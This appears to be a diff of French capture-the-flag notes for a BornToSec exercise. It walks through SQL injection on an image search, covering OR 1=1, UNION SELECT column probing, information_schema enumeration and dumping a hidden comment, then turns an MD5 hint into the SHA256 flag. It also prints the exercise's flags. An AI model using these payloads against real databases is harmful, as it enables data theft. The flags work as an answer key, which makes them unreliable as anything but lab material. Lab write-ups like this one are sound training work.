@@ -118,7 +118,44 @@ Flag is: 8be3c943b5749f34703c7b295a8ae8a7eeae92f8dfe03707743d2d29b02fe107
 ??? 
 
 
-7.❌
+7.✅
+Recherche une image par number
+
+On teste 1 OR 1=1 → 
+ça affiche toutes les images 
+
+On teste 1 UNION SELECT 1,2 -- 
+il y a 2 colonnes dans la requête
+
+On utilise 1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = database() --
+On découvre la table : list_images
+
+On utilise 1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name = CHAR(108,105,115,116,95,105,109,97,103,101,115) --
+→ On découvre les colonnes : id, url, title, comment
+
+On utilise 1 UNION SELECT comment, 2 FROM list_images --
+
+
+ID: 1 UNION SELECT comment, 2 FROM list_images -- 
+Title: 2
+Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+
+
+Le hash MD5 est : 1928e8083cf461a51303633093573c46
+→ Reverse MD5 : Love
+→ On le met en minuscule : love
+→ SHA256 de "love" : 04f0dce3775f4b5f2c2bfe3c1c9ed970984173af2d4a01fd7fa3ddbd5de5b2f2
+→ Flag final : 04f0dce3775f4b5f2c2bfe3c1c9ed970984173af2d4a01fd7fa3ddbd5de5b2f2
+
+04f0dce3775f4b5f2c2bfe3c1c9ed970984173af2d4a01fd7fa3ddbd5de5b2f2
+
+
+
+6⛔ et 7⛔ a verifier. 
+
+8.❌
+© BornToSec
+
 
 
 ```
